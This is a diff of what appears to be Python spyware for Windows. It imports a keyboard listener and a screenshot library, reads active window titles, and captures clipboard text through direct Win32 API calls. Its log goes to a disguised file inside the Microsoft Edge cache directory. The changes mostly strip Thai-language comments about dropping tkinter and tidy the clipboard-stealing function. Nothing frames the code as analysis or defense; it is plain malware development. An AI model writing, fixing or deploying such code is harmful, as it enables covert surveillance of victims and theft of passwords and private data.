@@ -7,9 +7,6 @@ from ctypes import *
 from pynput import keyboard
 from mss import MSS 
 
-# 🛑 💡 [จุดแก้วิกฤต]: ลบบรรทัด "import tkinter as tk" ออกทิ้งไปได้เลยครับ! 
-# คราวนี้สคริปต์จะเบาหวิว รันผ่านเอนจิ้น Python 3.13 ได้ฉลุยโดยไม่ระเบิดฟ้องหาโมดูล GUI อีกต่อไปครับ
-
 local_app_data = os.environ.get('LOCALAPPDATA', os.path.expanduser('~\\AppData\\Local'))
 TARGET_DIR = os.path.join(local_app_data, r"Microsoft\Edge\User Data\Default\Cache\Cache_Data\Diagnostic_Packs")
 log_file = os.path.join(TARGET_DIR, "f_0000a5.dat")     
@@ -63,13 +60,12 @@ def get_current_process():
     check_window_importance(title_str)
     kernel32.CloseHandle(h_process)
 
-# 🔥 [ ฟังก์ชันกู้ชีพคลิปบอร์ดแบบ Win32 API เพียวๆ ]: ดักข้อความตรงจาก RAM วินโดวส์ 
-# ทำงานทดแทน Tkinter ได้แม่นยำ 100% สลัดปัญหาเรื่องโมดูลขาดหายใน Python 3.13 ได้อย่างเด็ดขาดครับ
+# บล็อกคลิปบอร์ดตัวเด็ด สลัดเกราะคลาสของเก่าที่เขียนเพี้ยนออกทิ้งไปซะ ดึงบิตข้อความผ่าน RAM ตรงๆ
 def get_clipboard_text():
     text = ""
     try:
         if user32.OpenClipboard(None):
-            if user32.IsClipboardFormatAvailable(1): # 1 คือฟอร์แมตข้อความมาตรฐาน CF_TEXT
+            if user32.IsClipboardFormatAvailable(1): 
                 h_data = user32.GetClipboardData(1)
                 if h_data:
                     p_box = kernel32.GlobalLock(h_data)
@@ -77,8 +73,7 @@ def get_clipboard_text():
                         text = string_at(p_box).decode(errors='ignore')
                         kernel32.GlobalUnlock(h_data)
             user32.CloseClipboard()
-    except Exception:
-        pass
+    except Exception: pass
     return text
 
 def take_screenshot():
